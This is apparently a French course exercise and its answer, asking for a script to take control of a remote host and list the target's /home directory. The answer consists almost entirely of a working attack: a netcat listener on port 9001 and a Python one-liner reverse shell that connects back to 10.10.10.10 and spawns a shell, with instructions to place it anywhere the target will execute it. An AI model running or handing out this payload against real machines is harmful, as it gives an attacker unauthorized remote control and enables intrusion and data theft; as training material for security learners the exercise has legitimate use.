# Chapitre 17

## Consigne

- Réalisez un script qui va vous permettre de prendre le contrôle d’un hôte distant.
- Affichez le répertoire /home de l’utilisateur cible.


## Réponse

On écoute sur le port 9001 de notre machine

```bash
nc -lvnp 9001
```

Script à éxécuter dans un endroit que la machine distant va éxécuter (web, file, etc)

```bash
export RHOST="10.10.10.10";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

puis dans le terminal où on a éxécuter

```bash
nc -lvnp 9001
```

on est connécté sur la machine